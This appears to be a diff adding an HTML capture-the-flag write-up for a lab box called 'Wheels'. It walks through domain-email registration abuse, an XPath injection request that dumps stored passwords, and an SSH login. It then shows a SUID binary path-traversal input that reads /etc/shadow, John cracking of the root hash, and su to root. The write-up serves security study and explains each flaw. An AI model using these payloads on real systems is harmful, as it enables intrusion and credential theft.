@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Wheels &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Wheels</h1>
+    <div class="meta">Target: <code>192.168.158.202</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">XPathInjection</span><span class="tag">AccountTakeover</span><span class="tag">SUID</span><span class="tag">PathTraversal</span><span class="tag">john</span><span class="tag">CredentialHunting</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#xpath-injection">XPath Injection</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#suid-binary-path-traversal-etc-shadow-read">SUID Binary Path Traversal + /etc/shadow Read</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Wheels is a Linux web application box with a layered attack chain. An email address found on the site enables account registration that overwrites an existing employee account, granting portal access. XPath injection in the portal's search function dumps all user passwords from an XML data store. One of those passwords opens an SSH session as <code>bob</code>. The final escalation abuses a SUID binary that reads files by partial path, bypassing its own filter with a comment character to read <code>/etc/shadow</code>, crack root's hash, and <code>su</code> to root.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
+</code></pre>
+<p>A minimal two-port scan. Everything runs through the web application.</p>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>The site is "Wheels - Car Repair Services". An email address was visible on the landing page:</p>
+<pre><code>info@wheels.service
+</code></pre>
+<p>Adding <code>wheels.service</code> to <code>/etc/hosts</code> made virtual-host-based routing work. The employee portal at <code>/portal.php</code> became accessible after registering a new account with the <code>wheels.service</code> domain email, the registration system accepted it and granted employee-level permissions.</p>
+<blockquote>
+<p><strong>Why domain-matching registration is a vulnerability:</strong> the application trusted the email domain as a proxy for organizational membership. Registering <code>anything@wheels.service</code> passed the domain check and inherited whatever permissions that domain confers. This is account takeover without touching an existing password.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="xpath-injection">XPath Injection</h3>
+<p>Once inside the portal, fuzzing the search field in Burp revealed an XPath error message. XPath is used to query XML documents the same way SQL queries databases, and it's just as injectable when user input isn't sanitized.</p>
+<p>The injection payload (sourced from HackTricks):</p>
+<pre><code class="language-http">GET /portal.php?work=')]+|+//password%00&amp;action=search HTTP/1.1
+Host: wheels.service
+Cookie: PHPSESSID=30rl18ij19ososnibtrqna34hl
+</code></pre>
+<p>Response returned all usernames and passwords from the XML data store:</p>
+<pre><code>bob:‹redacted›
+alice:‹redacted›
+john:‹redacted›
+dan:‹redacted›
+alex:‹redacted›
+selene:‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>XPath injection vs SQL injection:</strong> XPath operates on XML documents instead of relational tables, but the injection mechanics are similar, unsanitized input breaks out of the intended query context. The <code>|</code> operator in XPath performs a union, and <code>//password</code> selects all <code>password</code> nodes anywhere in the document. The null byte <code>%00</code> terminates the original expression cleanly. The result is equivalent to <code>SELECT * FROM passwords</code> in SQL injection terms.</p>
+</blockquote>
+<p>SSH access using Bob's credentials:</p>
+<pre><code class="language-sh">ssh bob@192.168.158.202
+bob@192.168.158.202's password:
+$ whoami
+bob
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="suid-binary-path-traversal-etc-shadow-read">SUID Binary Path Traversal + /etc/shadow Read</h3>
+<p>LinPEAS found credentials in the web config:</p>
+<pre><code class="language-sh">/var/www/html/config.php:    define('PASSWORD', 'CanRipperCrackthis?09');
+/var/www/html/config.php:    define('USER', 'wheels');
+</code></pre>
+<p>More importantly, <code>/opt/get-list</code> had a SUID bit set. Running <code>strings</code> on the binary locally revealed it calls:</p>
+<pre><code>cat /root/details/employees
+cat /root/details/customers
+</code></pre>
+<p>The binary accepts <code>customers</code> or <code>employees</code> as input and rejects anything else, designed to prevent traversal. The filter checks for those literal strings, but a shell comment character appended after them bypasses the check while not corrupting the path argument:</p>
+<pre><code class="language-sh">$ /opt/get-list
+
+Which List do you want to open? [customers/employees]: ../../../../../../../../etc/shadow #employees
+Opening File....
+
+root:$6$Hk74of.if9klVVcS$EwLAljc7...:19123:0:99999:7:::
+bob:$6$9hcN2TDv4v9edSth$KYm56Aj6...:19123:0:99999:7:::
+</code></pre>
+<blockquote>
+<p><strong>Why <code>#employees</code> bypasses the filter but changes the path:</strong> the binary's string check confirms <code>employees</code> appears in the input, so validation passes. But the input is then passed to <code>cat</code> (or equivalent) as a file path, where <code>#</code> begins a shell comment, meaning the part after <code>#</code> is ignored by the shell, and the traversal path <code>../../../../etc/shadow</code> is what actually gets read. The filter trusted that <code>employees</code> equaled a safe path; it only checked for substring presence.</p>
+</blockquote>
+<p>Root's hash extracted:</p>
+<pre><code>root:$6$Hk74of.if9klVVcS$EwLAljc7.DOnqZqVOTC0dTa0bRd2ZzyapjBnEN8tgDGrR9ceWViHVtu6gSR.L/WTG398zZCqQiX7DP/1db3MF0:19123:...
+</code></pre>
+<p>Cracked with John:</p>
+<pre><code class="language-sh">john hash --wordlist=/usr/share/wordlists/rockyou.txt
+‹redacted›   (root)
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">$ su root
+Password:
+# whoami
+root
+# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Email domain registration checks are authorization controls, not authentication.</strong> Any address at the trusted domain passes, and any email service or local domain entry can satisfy that.</li>
+<li><strong>XPath injection follows the same logic as SQL injection.</strong> When an app queries XML with unsanitized input, union-style operators dump the entire document.</li>
+<li><strong>SUID binary filters that check for substring presence are trivially bypassed.</strong> <code>#employees</code> satisfies the string check while the comment character strips the literal string from the actual file path.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
